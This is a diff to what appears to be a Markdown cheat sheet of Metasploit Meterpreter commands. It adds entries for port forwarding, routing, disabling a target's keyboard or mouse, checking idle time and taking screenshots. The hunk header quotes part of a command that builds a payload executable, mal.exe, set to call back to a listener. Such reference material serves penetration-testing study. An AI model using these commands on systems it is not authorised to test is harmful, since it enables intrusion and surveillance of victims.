@@ -166,3 +166,19 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
     - `execute` : Run a given program with the privileges of the process the Meterpreter is loaded in.
 
     - `migrate` : Jump to a given destination process ID
+
+- ##### Network Commands:
+
+    - `ipconfig` : Show network interface information
+
+    - `portfwd` : Forward packets through TCP session
+
+    - `route` : Manage/view the system's routing table
+
+- ##### Other Commands:
+
+    - `idletime`: Display the duration that the GUI of thetarget machine has been idle.
+
+    - `uictl [enable/disable] [keyboard/mouse]` : Enable/disable either the mouse or keyboard of the target machine.
+
+    - `screenshot` : Save as an image a screenshot of the target machine.
